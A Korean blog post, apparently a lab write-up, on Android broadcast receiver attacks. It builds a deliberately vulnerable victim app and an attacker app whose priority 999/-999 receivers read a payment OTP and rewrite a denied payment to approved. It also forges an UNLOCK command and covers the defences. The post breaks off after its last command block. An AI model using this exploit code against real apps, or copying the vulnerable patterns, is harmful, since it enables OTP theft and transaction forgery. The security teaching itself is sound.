---
layout: post
title: "BroadcastReceiver와 ordered broadcast 실습 — 남의 앱이 결과를 고쳐 쓰는 길"
date: 2026-10-31 21:00:00 +0900
category: 블로그/기술문서
author: SeiKa
tags: [Android, AndroidSecurity, 모바일보안, BroadcastReceiver, OrderedBroadcast, abortBroadcast, RECEIVER_EXPORTED, Android16]
excerpt: "Android 13 에뮬레이터에서 extra로 발신자를 확인하던 exported 리시버는 셸과 권한 없는 앱 모두에게 잠금 해제를 내줬고, 앱이 보낸 암시적 ordered broadcast에는 다른 앱이 우선순위 999와 -999로 끼어들어 OTP를 읽고 거절된 결제를 APPROVED로 바꿨다. Android 16 이미지에서도 프로세스를 넘나드는 이 순서는 그대로였다."
---

[앞 글](/posts/android-lab-p1c15-activity-intent-injection/)에서는 exported 액티비티에 Intent를 밀어 넣었다. 브로드캐스트 리시버도 같은 문으로 들어온다. 리시버는 자기에게 온 브로드캐스트를 누가 보냈는지 알 길이 거의 없어서 위조에 약하다. 반대로 앱이 보내는 쪽일 때는 받는 쪽을 정하지 않으면 다른 앱이 끼어들고, ordered broadcast라면 결과까지 고쳐 쓴다. 피해자 앱과 공격자 앱을 직접 만들어 양쪽을 다 돌렸다.

주 기기는 Android 13 에뮬레이터(API 33, x86_64, userdebug, 빌드 TE1A.240213.009, 보안 패치 2024-03-01)다. userdebug라 `adb root`가 되고 실습 환경은 root 셸로 올라와 있었는데, root 셸(uid 0)에서는 권한 검사가 전부 통과해 버려서 `adb unroot`로 uid 2000으로 돌려 놓고 시작했다. Android 16의 바뀐 규칙을 보려고 API 36 에뮬레이터(빌드 BE2A.250530.026.F3, 패치 2025-07-05)를 따로 띄웠고, 거기서는 `aflags`를 읽어야 해서 root를 유지했다. 명령의 `$S`는 첫 명령 블록에서 정한 에뮬레이터 시리얼이다. 소스 링크는 Android 13은 frameworks/base `android-13.0.0_r84`, Android 16은 `android-16.0.0_r2` 태그로 걸고, Android 14 호환성 변경 정의는 `android-14.0.0_r1`, SMS 디스패치는 frameworks/opt/telephony `android-13.0.0_r84`에서 가져왔다. 13과 16 태그는 측정한 에뮬레이터 빌드와 같은 빌드는 아니고 가장 가까운 공개 태그다.

## 피해자, 공격자, 그리고 매니페스트에 안 보이는 리시버

피해자 `io.seika.bcastlab`(targetSdk 33, 디버그 키 서명)에는 푸시 서버가 보낸다고 가정한 `UNLOCK` 명령을 받아 잠금을 푸는 리시버를 넣었다. 일부러 권한 없이 export했고, 발신자 확인은 extra `origin`이 `push-server`인지 보는 것으로 끝낸다. 같은 일을 서명 권한으로 막은 `SafeCtrlReceiver`도 나란히 뒀다. 결제 쪽은 `PayActivity`가 금액과 OTP를 담은 `CHECK` 브로드캐스트를 ordered로 보내고, 앱 안의 `Verifier`가 한도(10000)를 넘으면 거절하게 만들었다.

```java
// apps/victim/src/io/seika/bcastlab/CtrlReceiver.java (전체)
package io.seika.bcastlab;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

// Vulnerable on purpose: exported, no permission, and the "who sent this" check is an extra
// that any sender can set.
public class CtrlReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        String origin = i.getStringExtra("origin");
        String code = i.getStringExtra("code");
        if (!"push-server".equals(origin)) {
            Log.w(Lab.TAG, "CtrlReceiver rejected origin=" + origin + Lab.sentFrom(this));
            return;
        }
        Lab.setState(c, "UNLOCKED", "CtrlReceiver origin=" + origin + " code=" + code);
        Log.i(Lab.TAG, "CtrlReceiver UNLOCK accepted origin=" + origin + " code=" + code
                + Lab.sentFrom(this));
    }
}
```

공격자 `io.seika.bcastatk`는 다른 키로 서명했다. 매니페스트에 피해자의 서명 권한 `INTERNAL`을 `uses-permission`으로 적어 두었는데, 서명이 다르니 설치해도 부여되지 않는다. 이게 뒤에서 쓸모가 있다. 앱들은 javac, d8, aapt, zipalign, apksigner를 차례로 부르는 작은 빌드 스크립트로 만들었다.

[매니페스트 매핑](/posts/android-lab-p1c06-manifest-attack-surface-mapping/)에서 쓴 매퍼를 피해자 APK에 돌리면 리시버 쪽은 이렇게 나온다.

![apktool d -q -f -s -p fw -o decoded/bcastlab out/bcastlab.apk 후 python map_surface.py decoded/bcastlab --platform aosp13-core-AndroidManifest.xml 출력. io.seika.bcastlab minSdk 26 targetSdk 33, OPEN activity MainActivity와 PayActivity, OPEN receiver .CtrlReceiver exported=true (explicit) perm: -, GUARDED receiver .SafeCtrlReceiver perm: io.seika.bcastlab.permission.CONTROL (signature, this app). 아래 grep -A3 "<receiver" 결과로 CtrlReceiver의 action io.seika.bcastlab.action.UNLOCK, SafeCtrlReceiver의 android:permission과 action SAFE_UNLOCK](/assets/img/android-mastery/p1c16/01-host-map-receivers.png)

`CtrlReceiver`는 OPEN, `SafeCtrlReceiver`는 GUARDED다. 그런데 결제 쪽 `Verifier`는 이 지도에 아예 없다. 코드에서 `registerReceiver()`로 등록하는 리시버라 매니페스트에 흔적이 남지 않는다. jadx로 풀어서 등록과 송신 호출을 grep해야 보인다.

![jadx -q -d jadx/bcastlab out/bcastlab.apk 후 grep -rn -E "registerReceiver 또는 setPriority 또는 sendOrderedBroadcast 또는 action.CHECK" 결과. PayActivity.java:36 new Intent("io.seika.bcastlab.action.CHECK").putExtra("amount", ...).putExtra("otp", str2), PayActivity.java:47과 53 sendOrderedBroadcast(intentPutExtra, str, new Result(...), null, 0, "PENDING", null), Verifier.java:21 new IntentFilter("io.seika.bcastlab.action.CHECK"), Verifier.java:22 setPriority(0), Verifier.java:23 context.registerReceiver(new Verifier(), intentFilter, 4)](/assets/img/android-mastery/p1c16/02-host-jadx-dynamic.png)

`registerReceiver(..., 4)`의 4는 `RECEIVER_NOT_EXPORTED`다([Context.java](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/content/Context.java#603)). 그러니 다른 앱이 `Verifier`에게 직접 보낼 수는 없다. 다만 이 플래그는 "누가 나에게 보낼 수 있나"만 정한다. 앱이 보내는 `CHECK`를 또 누가 받는지는 송신하는 쪽 Intent가 정하는데, `PayActivity`는 패키지도 권한도 붙이지 않은 암시적 Intent로 보낸다. 그래서 리시버 목록만 봐서는 이 구멍이 안 보이고 송신 코드를 같이 열어야 했다.

## 셸에서 UNLOCK을 보내 봤다

피해자의 `MainActivity`를 띄워 둔 채로 셸에서 보냈다. 컴포넌트를 지정하지 않은 암시적 브로드캐스트로 한 번, `-n`으로 리시버를 지정하되 extra 없이 한 번, `-n`에 `origin`까지 넣어 한 번이다.

```bash
S=emulator-5600
adb -s $S unroot
sleep 3
adb -s $S wait-for-device
adb -s $S install -r out/bcastlab.apk
adb -s $S install -r out/bcastatk.apk
adb -s $S shell id -u
adb -s $S shell am start -W -n io.seika.bcastlab/.MainActivity --ez reset true | grep -E "Status|Activity:"
adb -s $S logcat -c
adb -s $S shell am broadcast -a io.seika.bcastlab.action.UNLOCK --es origin push-server --es code 0000
adb -s $S shell am broadcast -n io.seika.bcastlab/.CtrlReceiver -a io.seika.bcastlab.action.UNLOCK
adb -s $S shell am broadcast -n io.seika.bcastlab/.CtrlReceiver -a io.seika.bcastlab.action.UNLOCK --es origin push-server --es code 0000
sleep 1
adb -s $S logcat -d -v tag -s BCASTLAB BroadcastQueue | grep -E "BCASTLAB|io\.seika"
```

![API 33 에뮬레이터에서 adb shell id -u 결과 2000, MainActivity를 --ez reset true로 띄운 뒤 am broadcast 세 번. 세 번 모두 Broadcast completed: result=0. logcat에는 W/BroadcastQueue: Background execution not allowed: receiving Intent { act=io.seika.bcastlab.action.UNLOCK flg=0x400010 (has extras) } to io.seika.bcastlab/.CtrlReceiver, W/BCASTLAB: CtrlReceiver rejected origin=null sentFrom=n/a(sdk 33), I/BCASTLAB: CtrlReceiver UNLOCK accepted origin=push-server code=0000 sentFrom=n/a(sdk 33)](/assets/img/android-mastery/p1c16/03-device-forge-shell.png)

`-n` 없이 보내면 매칭되는 exported 리시버가 전부 받는다고 생각했는데 틀렸다. 첫 번째 브로드캐스트는 `Background execution not allowed`로 버려졌고, 피해자 앱이 포그라운드에 떠 있었는데도 그랬다. Android 13의 [BroadcastQueue.java 1707~1733행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/BroadcastQueue.java#1707)이 매니페스트 리시버로 가는 브로드캐스트마다 `getAppStartModeLOSP()`를 묻는다. 여기서 넘기는 `alwaysRestrict` 인자가 true라 맨 앞의 `isPendingTopUid` 예외만 빼면 프로세스가 idle인지 따지지 않고 제한 판정으로 넘어가고([ActivityManagerService.java 6065~6091행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/ActivityManagerService.java#6065)), targetSdk 26 이상 앱은 거기서 제한 모드를 받는다([같은 파일 5984~5990행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/ActivityManagerService.java#5984)). 그다음 컴포넌트도 패키지도 지정되지 않았고 서명 권한도 요구하지 않는 브로드캐스트면 건너뛴다.

![android-13.0.0_r84 BroadcastQueue.java 1703~1735행. 1707행 if (!skip) 강조, 1708~1710행 mService.getAppStartModeLOSP(uid, packageName, targetSdkVersion, -1, true, false, false), 1721~1726행 FLAG_RECEIVER_EXCLUDE_BACKGROUND이거나 getComponent() == null && getPackage() == null && FLAG_RECEIVER_INCLUDE_BACKGROUND 없음 && !isSignaturePerm(r.requiredPermissions) 조건, 1729행 Slog.w "Background execution not allowed: receiving ", 1732행 skip = true](/assets/img/android-mastery/p1c16/20-src-a13-background-check.png)

Android 8에서 들어온 [암시적 브로드캐스트 제한](https://developer.android.com/about/versions/oreo/background)이 이것이다. 위조하는 쪽 입장에서는 `-n`이나 `-p` 하나만 붙이면 그만이라 방어가 되지는 않는다. 두 번째 시도에서 보듯 지정만 하면 리시버까지 들어가고, 거기서부터는 리시버 자신의 검사뿐이다. 세 번째 시도처럼 `--es origin push-server`를 넣자 그 검사도 통과했다.

세 번 모두 `result=0`이 찍혔다. 버려진 것, 거절된 것, 받아들여진 것이 셸에서는 똑같이 보인다. `am broadcast`는 항상 결과 리시버를 붙인 ordered broadcast로 보내고([ActivityManagerShellCommand.java 808~810행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/ActivityManagerShellCommand.java#808), 인자 중 `true`가 serialized), 출력되는 값은 아무도 `setResult()`를 부르지 않았을 때의 초기 코드 0이다. 리시버가 동작했는지는 로그나 화면으로 확인해야 한다.

![android-13.0.0_r84 ActivityManagerShellCommand.java 802~815행. 802행 IntentReceiver receiver = new IntentReceiver(pw), 805행 pw.println("Broadcasting: " + intent), 808~810행 mInterface.broadcastIntentWithFeature(null, null, intent, null, receiver, 0, null, null, requiredPermissions, null, null, OP_NONE, bundle, true, false, mUserId), 811~813행 if (!mAsync) receiver.waitForFinish()](/assets/img/android-mastery/p1c16/30-src-a13-am-broadcast-ordered.png)

에뮬레이터 화면에서는 잠금이 풀려 있었다.

![BcastLab MainActivity 주황색 화면. state: UNLOCKED, last change by: CtrlReceiver origin=push-server code=0000, at 02:03:28](/assets/img/android-mastery/p1c16/04-device-unlocked.png)

## 다른 키로 서명한 앱의 위조와 서명 권한 리시버

셸은 uid 2000이라 일반 앱보다 권한이 많다. 공격자 앱의 `FireActivity`로 같은 브로드캐스트를 보내 봤다. `--es target ctrl`이면 `CtrlReceiver`로, `safe`면 `SafeCtrlReceiver`로 `origin=push-server`, `code=atk`를 담아 `sendBroadcast()`한다. 이어서 셸로도 `SafeCtrlReceiver`를 두드리고, 마지막으로 피해자 앱 자신이 `SafeCtrlReceiver`에 보내게 했다.

```bash
adb -s $S shell am start -S -W -n io.seika.bcastlab/.MainActivity
adb -s $S shell am start -n io.seika.bcastlab/.MainActivity --ez reset true
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastatk/.FireActivity --es target ctrl
sleep 1
adb -s $S shell am start -n io.seika.bcastatk/.FireActivity --es target safe
adb -s $S shell am broadcast -n io.seika.bcastlab/.SafeCtrlReceiver -a io.seika.bcastlab.action.SAFE_UNLOCK --es origin push-server
adb -s $S shell am start -n io.seika.bcastlab/.MainActivity --es send safe
sleep 4
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK BroadcastQueue | grep -E "BCASTLAB|BCASTATK|io\.seika"
```

중간의 `sleep 1`은 처음에 없었다. `FireActivity`는 `onCreate()`에서 보내고 바로 `finish()`하는데, 두 번째 실행이 첫 인스턴스가 끝나기 전에 도착해 `intent has been delivered to currently running top-most instance`가 뜨고 SAFE 쪽은 아예 송신되지 않았다. 한 박자 쉬게 하고 다시 찍었다.

다시 돌릴 때 두 군데서 더 걸렸다. 마지막 `sleep`이 2초였을 때는 `SafeCtrlReceiver UNLOCK accepted` 줄이 아직 찍히기 전에 logcat을 읽어 버려서 4초로 늘렸다. 그리고 결제 실험을 한 번 돌린 뒤라 `PayActivity`가 피해자 태스크 맨 위에 있으면 `am start -n .../.MainActivity --es send safe`가 `intent has been delivered to currently running top-most instance` 경고만 찍고 아무것도 보내지 않았다. 태스크만 앞으로 나오고 `MainActivity`의 `onNewIntent()`도 `onCreate()`도 불리지 않은 것이다. 그래서 첫 줄에 `am start -S`로 피해자 태스크를 새로 띄워 `MainActivity`를 맨 위에 두고 시작한다. 캡처에서 `--es send safe` 뒤에 같은 경고가 보이지만, 이때는 `MainActivity`가 맨 위라 `onNewIntent()`로 extra가 처리됐다.

![logcat 결과. I/BCASTATK: FireActivity sent io.seika.bcastlab.action.UNLOCK to io.seika.bcastlab/.CtrlReceiver origin=push-server uid=10180, 같은 앱이 SAFE_UNLOCK을 SafeCtrlReceiver로 보낸 줄, I/BCASTLAB: CtrlReceiver UNLOCK accepted origin=push-server code=atk, W/BroadcastQueue: Permission Denial: broadcasting Intent { act=...SAFE_UNLOCK flg=0x10 ... } from io.seika.bcastatk (pid=6541, uid=10180) to io.seika.bcastlab/.SafeCtrlReceiver requires io.seika.bcastlab.permission.CONTROL, 셸에 대한 같은 Permission Denial ... from null (pid=6701, uid=2000), 마지막으로 MainActivity sent ... shareIdentity=false와 SafeCtrlReceiver UNLOCK accepted origin=push-server](/assets/img/android-mastery/p1c16/05-device-forge-app-vs-perm.png)

요청한 서명 권한조차 부여받지 못한 uid 10180 앱이 `code=atk`로 잠금을 풀었다. 송신에는 [패키지 가시성](/posts/android-concept-atlas-c11-package-visibility-uri-permission/) 필터도 걸리지 않는다. 브로드캐스트를 보낼 때 수신자 조회는 SYSTEM_UID로 돌기 때문에([ResolveIntentHelper.java 325~330행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/pm/ResolveIntentHelper.java#325)) 공격자 매니페스트에 `<queries>`가 없어도 된다.

`SafeCtrlReceiver`는 공격자에게도 셸에게도 `Permission Denial`로 막혔고, `onReceive()`는 불리지 않았다. 검사는 시스템이 이 리시버에 전달하기 직전에 하고([BroadcastQueue.java 1585~1597행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/BroadcastQueue.java#1585)), 걸리면 앱 프로세스로는 아무것도 가지 않는다. 같은 서명인 피해자 앱 자신은 통과했다. 로그 형식은 `from <패키지> (pid, uid) to <컴포넌트> requires <권한>`이고, 셸은 패키지명 자리가 비어 `from null (uid=2000)`으로 찍힌다. `sendBroadcast()`는 수신 측이 받아들였는지 막혔는지를 송신자에게 알려 주지 않는다. 공격자는 아무 신호 없이 몇 번이고 다시 보내 볼 수 있고, 막혔다는 사실은 시스템 로그의 `Permission Denial`에만 남는다.

## 앱이 보낸 CHECK를 다른 앱이 먼저 받는다

이제 반대 방향이다. `PayActivity`가 보내는 부분과 `Verifier` 등록부를 보면 이렇다.

```java
// apps/victim/src/io/seika/bcastlab/PayActivity.java 50~59행 (발췌)
        String perm = null;
        if ("package".equals(mode)) {
            b.setPackage(getPackageName());
        } else if ("permission".equals(mode)) {
            perm = Lab.PERM_INTERNAL;
        } else if ("noabort".equals(mode)) {
            b.addFlags(Intent.FLAG_RECEIVER_NO_ABORT);
        }
        sendOrderedBroadcast(b, perm, new Result(mode, amount), null,
                Activity.RESULT_CANCELED, "PENDING", null);
```

```java
// apps/victim/src/io/seika/bcastlab/Verifier.java 17~24행 (발췌)
    static synchronized void ensure(Context app) {
        if (registered) return;
        IntentFilter f = new IntentFilter(Lab.ACTION_CHECK);
        f.setPriority(0);
        app.registerReceiver(new Verifier(), f, Context.RECEIVER_NOT_EXPORTED);
        registered = true;
        Log.i(Lab.TAG, "Verifier registered priority=0 flags=RECEIVER_NOT_EXPORTED");
    }
```

기본 모드는 `mode=implicit`로, 위 분기 어디에도 걸리지 않아 아무 제한 없는 `new Intent(CHECK)`가 나간다. 초기 결과는 코드 0(`RESULT_CANCELED`), 데이터 `PENDING`이다. `Verifier`는 금액이 한도 이하면 `RESULT_OK`(-1)를, 넘으면 0과 `DENIED by Verifier`를 결과에 쓴다. 마지막에 도는 `Result` 리시버는 코드가 -1이면 APPROVED로 판단한다.

공격자 `ArmActivity`는 같은 액션에 리시버 둘을 우선순위 999와 -999로 등록한다.

```java
// apps/attacker/src/io/seika/bcastatk/ArmActivity.java 32~33행, 47~70행 (발췌)
                app.registerReceiver(new Hi(), filter(999), Context.RECEIVER_EXPORTED);
                app.registerReceiver(new Lo(), filter(-999), Context.RECEIVER_EXPORTED);

    static final class Hi extends BroadcastReceiver {
        @Override
        public void onReceive(Context c, Intent i) {
            Log.i(TAG, "HI(999) got ordered=" + isOrderedBroadcast() + " amount=" + i.getIntExtra("amount", -1)
                    + " otp=" + i.getStringExtra("otp") + " code=" + getResultCode() + " data=" + getResultData());
            if ("abort".equals(mode)) {
                setResult(Activity.RESULT_OK, "APPROVED (set by bcastatk HI, then aborted)", null);
                abortBroadcast();
                Log.w(TAG, "HI(999) setResult(OK) + abortBroadcast() abort=" + getAbortBroadcast());
            }
        }
    }

    static final class Lo extends BroadcastReceiver {
        @Override
        public void onReceive(Context c, Intent i) {
            Log.i(TAG, "LO(-999) got ordered=" + isOrderedBroadcast() + " code=" + getResultCode()
                    + " data=" + getResultData());
            if ("forge".equals(mode)) {
                setResult(Activity.RESULT_OK, "APPROVED (rewritten by bcastatk LO)", null);
                Log.w(TAG, "LO(-999) rewrote result -> code=" + getResultCode() + " data=" + getResultData());
            }
        }
    }
```

먼저 공격자 없이 한 번, `sniff` 모드로 등록한 뒤 한 번 결제를 돌렸다.

```bash
adb -s $S shell am force-stop io.seika.bcastatk
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB | grep BCASTLAB
adb -s $S shell am start -n io.seika.bcastatk/.ArmActivity --es mode sniff
sleep 2
adb -s $S shell dumpsys activity broadcasts io.seika.bcastatk | grep -E "^  \* ReceiverList|Action:|mPriority"
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK | grep -E "BCASTLAB|BCASTATK"
```

![첫 실행에서 PayActivity send mode=implicit amount=50000 otp=245921, Verifier(0) in ordered=true code=0 data=PENDING, Verifier(0) out code=0 data=DENIED by Verifier: over limit 10000, PayActivity final ... -> DENIED. dumpsys activity broadcasts io.seika.bcastatk에서 ReceiverList 두 개(6541 io.seika.bcastatk/10180/u0), Action "io.seika.bcastlab.action.CHECK", mPriority=-999와 mPriority=999. 두 번째 실행에서 PayActivity send otp=740616, I/BCASTATK: HI(999) got ordered=true amount=50000 otp=740616 code=0 data=PENDING, Verifier in/out, I/BCASTATK: LO(-999) got ordered=true code=0 data=DENIED by Verifier: over limit 10000, PayActivity final -> DENIED](/assets/img/android-mastery/p1c16/06-device-ordered-sniff.png)

`dumpsys`에 공격자 프로세스가 `CHECK`에 대해 등록한 `ReceiverList` 두 개가 우선순위 999와 -999로 보인다. 두 번째 결제에서는 HI가 피해자의 `Verifier`보다 먼저 받아 OTP 740616을 그대로 읽었고, LO는 `Verifier`가 끝난 뒤 그 판정을 받아 봤다. 결제 결과 자체는 아직 DENIED다. 엿보기만 했기 때문이다. `ArmActivity`를 띄운 직후 `sleep 2`는 처음엔 없었는데, 그때는 리시버 등록이 끝나기 전에 `dumpsys`가 돌아 아무것도 나오지 않았다.

## LO(-999)가 거절을 승인으로 바꿨다

`forge` 모드로 다시 무장하고 같은 결제를 돌렸다.

```bash
adb -s $S shell am start -n io.seika.bcastatk/.ArmActivity --es mode forge
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK | grep -E "BCASTLAB|BCASTATK"
```

![forge 모드 결과. Verifier registered priority=0 flags=RECEIVER_NOT_EXPORTED, PayActivity send mode=implicit amount=50000 otp=521835, HI(999) got ... otp=521835 code=0 data=PENDING, Verifier(0) out code=0 data=DENIED by Verifier: over limit 10000, LO(-999) got ... data=DENIED by Verifier, W/BCASTATK: LO(-999) rewrote result -> code=-1 data=APPROVED (rewritten by bcastatk LO), I/BCASTLAB: PayActivity final code=-1 data=APPROVED (rewritten by bcastatk LO) -> APPROVED](/assets/img/android-mastery/p1c16/07-device-ordered-forge.png)

`Verifier`는 제대로 거절했다. 그 뒤에 도는 LO가 결과를 -1과 APPROVED로 덮어썼고, 결과 리시버는 그 값을 받았다. 화면에는 한도의 다섯 배 금액이 승인으로 떴다.

![PayActivity 초록색 화면. Pay (mode=implicit), amount: 50000 (limit 10000), APPROVED, resultCode: -1, resultData: APPROVED (rewritten by bcastatk LO)](/assets/img/android-mastery/p1c16/08-device-pay-forged.png)

ordered broadcast의 결과는 리시버 하나가 끝날 때마다 브로드캐스트 레코드에 그대로 복사된다. Android 13 큐에서는 [BroadcastQueue.java 596~603행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/am/BroadcastQueue.java#596)이 그 자리다. 누가 쓴 값인지는 남지 않는다. 다음 리시버와 마지막 결과 리시버가 보는 것은 직전 리시버가 남긴 값뿐이다. 이번 실험에서는 `Verifier` 뒤에 LO가 있었기 때문에 `Verifier`의 DENIED는 결과 리시버까지 가지 못했다.

## abortBroadcast와 FLAG_RECEIVER_NO_ABORT

이번에는 HI가 결과를 APPROVED로 쓰고 `abortBroadcast()`를 부르게 했다. 두 번째 실행에서는 피해자가 `FLAG_RECEIVER_NO_ABORT`를 붙여 보낸다(`--es mode noabort`).

```bash
adb -s $S shell am start -n io.seika.bcastatk/.ArmActivity --es mode abort
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK | grep -E "BCASTLAB|BCASTATK"
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000 --es mode noabort
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK | grep -E "BCASTLAB|BCASTATK"
```

![abort 모드 첫 실행: PayActivity send otp=712389, HI(999) got ..., W/BCASTATK: HI(999) setResult(OK) + abortBroadcast() abort=true, 바로 PayActivity final code=-1 data=APPROVED (set by bcastatk HI, then aborted) -> APPROVED로 Verifier 줄 없음. noabort 실행: PayActivity send mode=noabort otp=029565, HI가 같은 abort, Verifier(0) in ordered=true code=-1 data=APPROVED (set by bcastatk HI, then aborted), Verifier(0) out code=0 data=DENIED, LO(-999) got ... DENIED, PayActivity final code=0 ... -> DENIED](/assets/img/android-mastery/p1c16/09-device-ordered-abort.png)

첫 실행에서는 `Verifier`가 한 줄도 찍히지 않았다. abort하면 아래 우선순위 리시버는 건너뛰지만 결과 리시버는 여전히 불리고, 그 결과 리시버는 HI가 남긴 APPROVED를 받는다.

`FLAG_RECEIVER_NO_ABORT`를 붙이자 abort는 무시됐고 `Verifier`가 돌아 DENIED로 돌려놨다. 그런데 `Verifier`의 입력을 보면 `code=-1 data=APPROVED (set by bcastatk HI, then aborted)`다. 플래그가 지우는 것은 abort뿐이고 HI의 `setResult()`는 그대로 다음 리시버로 넘어간다.

![android-13.0.0_r84 BroadcastQueue.java 596~603행. r.resultCode = resultCode; r.resultData = resultData; r.resultExtras = resultExtras; if (resultAbort && (r.intent.getFlags()&Intent.FLAG_RECEIVER_NO_ABORT) == 0) r.resultAbort = resultAbort; else r.resultAbort = false;](/assets/img/android-mastery/p1c16/23-src-a13-no-abort.png)

소스도 그렇게 생겼다. 결과 세 값은 조건 없이 복사하고 abort만 플래그를 본다. 이번 실험에서는 `Verifier`가 판정을 처음부터 다시 쓰니 결과가 바로잡혔지만, 받은 결과에 이어서 쓰는 리시버였다면 HI의 값이 섞였을 것이다.

ordered broadcast로 SMS를 가로채던 수법이 이 abort를 썼다. 높은 우선순위로 `SMS_RECEIVED`를 받아 abort하면 기본 문자 앱에 메시지가 안 갔다. KitKat은 기본 SMS 앱 역할을 만들었고([Android Developers Blog, 2013](https://android-developers.googleblog.com/2013/10/getting-your-sms-apps-ready-for-kitkat.html)), 같은 API 19에 [`Intent.FLAG_RECEIVER_NO_ABORT`](https://developer.android.com/reference/android/content/Intent#FLAG_RECEIVER_NO_ABORT)가 추가됐다. 수신 SMS 디스패치는 `SMS_DELIVER`와 `SMS_RECEIVED`에 이 플래그를 붙이고, Android 13 telephony 코드에서도 [InboundSmsHandler.java 1306~1308행](https://android.googlesource.com/platform/frameworks/opt/telephony/+/refs/tags/android-13.0.0_r84/src/java/com/android/internal/telephony/InboundSmsHandler.java#1306)에 그대로 있다. 실제 SMS 수신 경로는 이번에 돌리지 않았고 소스로만 확인했다.

## sendBroadcast로 보내면 결과 파이프라인이 없다

같은 abort 모드 공격자를 둔 채 피해자가 `sendBroadcast()`로 보내게 하면 어떻게 되는지도 봤다(`--es mode normal`).

```bash
adb -s $S shell am start -n io.seika.bcastatk/.ArmActivity --es mode abort
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000 --es mode normal
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK BroadcastReceiver | grep -E "BCASTLAB|BCASTATK|trying to return result"
```

![normal 모드 결과. PayActivity send mode=normal otp=775189, HI(999) got ordered=false amount=50000 otp=775189 code=-1 data=null, E/BroadcastReceiver: BroadcastReceiver trying to return result during a non-ordered broadcast와 java.lang.RuntimeException 줄이 두 쌍, HI(999) setResult(OK) + abortBroadcast() abort=true, LO(-999) got ordered=false code=-1 data=null, Verifier(0) in ordered=false code=-1 data=null, 같은 E/BroadcastReceiver 쌍 하나 더, Verifier(0) out code=0 data=DENIED. PayActivity final 줄 없음](/assets/img/android-mastery/p1c16/10-device-normal-abort.png)

HI가 `abort=true`를 찍었는데도 LO와 `Verifier` 모두 받았다. 리시버들은 처음부터 `code=-1 data=null`로 시작했고, `setResult()`와 `abortBroadcast()`를 부를 때마다 `trying to return result during a non-ordered broadcast`가 E 레벨로 RuntimeException 스택과 함께 찍혔다. HI에서 두 번(setResult, abort), `Verifier`에서 한 번이다. 순서는 LO가 `Verifier`보다 먼저였고, 두 번 돌렸을 때 모두 그랬다. 일반 브로드캐스트에서는 프로세스 사이 순서가 보장되지 않는다.

![android-13.0.0_r84 BroadcastReceiver.java 271~293행 sendFinished. 282행 if (mOrderedHint) am.finishReceiver(mToken, mResultCode, mResultData, mResultExtras, mAbortBroadcast, mFlags); else 주석 "This broadcast was sent to a component; it is not ordered" 아래 288행 am.finishReceiver(mToken, 0, null, null, false, mFlags)](/assets/img/android-mastery/p1c16/21-src-a13-sendfinished.png)

[BroadcastReceiver.java 271~293행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/content/BroadcastReceiver.java#271)을 보면 non-ordered일 때는 리시버가 무엇을 썼든 `0, null, null, false`를 돌려보낸다. 결과를 조작할 길은 없어졌지만 OTP 775189는 HI 로그에 그대로 찍혔다.

## setPackage와 서명 권한으로 수신자를 좁히자 공격자가 빠졌다

방어는 송신 쪽에서 수신자를 좁히는 것이다. `package` 모드는 `setPackage(getPackageName())`, `permission` 모드는 서명 권한 `INTERNAL`을 `receiverPermission`으로 붙인다. 공격자는 `forge`로 무장해 둔 상태에서 돌렸다. 끝에는 셸이 직접 `CHECK`를 보내 봤다.

```bash
adb -s $S shell am start -n io.seika.bcastatk/.ArmActivity --es mode forge
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000 --es mode package
sleep 2
adb -s $S shell am start -n io.seika.bcastlab/.PayActivity --ei amount 50000 --es mode permission
sleep 2
adb -s $S logcat -d -v tag -s BCASTLAB BCASTATK BroadcastQueue | grep -E "BCASTLAB|BCASTATK|io\.seika"
adb -s $S logcat -c
adb -s $S shell am broadcast -a io.seika.bcastlab.action.CHECK --ei amount 50000
adb -s $S logcat -d -v tag -s BCASTATK BroadcastQueue | grep -E "BCASTATK|Exported Denial"
```

